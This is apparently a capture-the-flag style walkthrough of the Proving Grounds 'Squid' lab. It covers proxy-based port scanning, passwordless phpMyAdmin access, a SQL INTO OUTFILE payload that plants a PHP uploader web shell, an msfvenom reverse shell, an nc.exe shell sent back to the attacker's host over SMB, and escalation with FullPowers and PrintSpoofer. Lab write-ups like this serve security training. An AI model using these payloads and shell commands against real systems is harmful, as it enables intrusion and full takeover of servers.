# PG Squid
## Squid Proxy, Spose, foxyproxy
## nmap
```
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 3128/tcp)
HOP RTT      ADDRESS
1   79.55 ms 192.168.49.1
2   79.77 ms 192.168.57.189
```
## TCP/3128
```
Banner Grab
echo -e 'GET / HTTP/1.1\r\n' | nc 192.168.57.189 3128
Server:squid/4.14

Check Exploit DB for any version-specific vulnerabilities.
searchsploit squid
```
## HTTP Proxy Testing
```
Nothing for this version in Exploit DB. I checked Google for some exploits as well, but I'm not seeing any remote exploits available.
https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid?ref=benheater.com

Sset the Squid proxy on Kali to act as a pivot point to internal services and/or ports.
Ask Squid to proxy back to itself and request any HTTP resource listening on {port}.
In other words, ask http://192.168.57.189 to check if http:192.168.57.189:{port} is serving any web resources.

TThere may be services listening only on loop back, or a firewall blocking ports.
While the firewall may be blocking access to ports from the outside, the firewall is not going to block access to ports from itself or an internal address.

curl --proxy http://192.168.57.189:3128 http://192.168.57.189
Ask the proxy server if itself is serving any HTTP content on 'TCP/80'
The proxy returns an error that the URL cannot be retrieved.
```
## Proxy Port Scanning with cURL, Spose
```
Squid will throw an error if it can't reach a page: ERROR: The requested URL could not be retrieved.
We could come up with a script to test ports through the proxy or look for a tool to do it for us:
https://github.com/aancw/spose?ref=benheater.com

git clone https://github.com/aancw/spose
cd spose
python3 spose.py --proxy http://192.168.57.189:3128 --target 192.168.57.189
3306 and 8080 are up. 
```
## Testing the Proxied Services, foxyproxy
```
Setting the Proxy
I am using foxyproxy in my browser. From here, I can set the Squid proxy and navigate to the pages.
https://github.com/foxyproxy
```
## TCP/8080
```
PhpMyAdmin looks interesting, let's take a look and see if default credentials work.
Phpmyadmin is configured to allow passwordless login for the root user.
root: <blank>
```
## PhpMyAdmin
```
Squid, acting as a reverse proxy, allows unauthenticated access to an internal Wamp server and PhpMyAdmin interface.
The PhpMyAdmin interface is configured with passwordless login for the root user, allowing an attacker to create files in the web root, leading to RCE.
In the PhpMyAdmin interface, you can click on the SQL tab and run a sql payload to create a uploader.php file in the web root:

SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';

We can create a PHP reverse shell and upload it via the php uploader to web root.
msfvenom -p php/reverse_php LHOST=192.168.49.57 LPORT=443 -f raw -o shell.php
sudo rlwrap nc -lnvp 443

Open http://192.168.57.189:8080/shell.php in your browser or use curl:
curl --proxy http://192.168.57.189:3128 -s http://192.168.57.189:8080/shell.php

Upgrade Your Shell
Copy nc.exe to your current directory and serve it using smbserver.py.

cp /usr/share/windows-resources/binaries/nc.exe .
smbserver.py -smb2support -username evil -password evil evil $PWD

sudo rlwrap nc -lnvp 80

Now, from your reverse shell, execute nc.exe by using the UNC path.
net use z: \\192.168.49.57\evil /user:evil evil
Z:\nc.exe 192.168.49.57 80 -e cmd.exe
```
## Privesc
```
A bit strange getting NT with no privs, after some research: 
https://github.com/itm4n/FullPowers?ref=benheater.com
The author has developed a local exploit that will streamline the process of regaining all of the privileges that service accounts used to come with.

After running the exploit, our service account now has SeImpersonatePrivilege enabled. 
From here a simple PrintSpoofer64.exe -i -c cmd to get System. 
```






